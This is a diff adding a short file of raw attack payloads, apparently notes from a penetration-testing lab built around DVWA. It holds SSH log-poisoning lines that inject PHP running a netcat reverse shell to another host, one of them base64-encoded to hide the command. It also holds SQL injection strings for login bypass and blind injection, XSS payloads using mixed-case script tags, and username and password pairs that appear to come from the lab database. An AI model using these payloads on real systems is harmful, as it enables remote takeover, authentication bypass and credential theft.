@@ -1,0 +1,33 @@
+ssh "<?passthru('nc -e /bin/sh 192.168.1.133 8888');?>"@192.168.1.131
+
+
+ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTMzIDg4ODg='));?>"@192.168.1.131
+
+
+123456' and 1=1#
+
+123456'and 1=2#
+
+
+aaa' or 1=1 #
+
+admin'#
+
+
+Username=admin
+Password=adminpass
+Signature=Monkey!
+
+Username=adrian
+Password=somepassword
+Signature=Zombie Films Rock!
+
+DVMA
+Vulnerability: SQL Injection (Blind)
+1' and 1=1#
+
+
+<sCripT>alert("Fuck")</scRipt>
+
+Javascript:
+";alert('Fuck');//
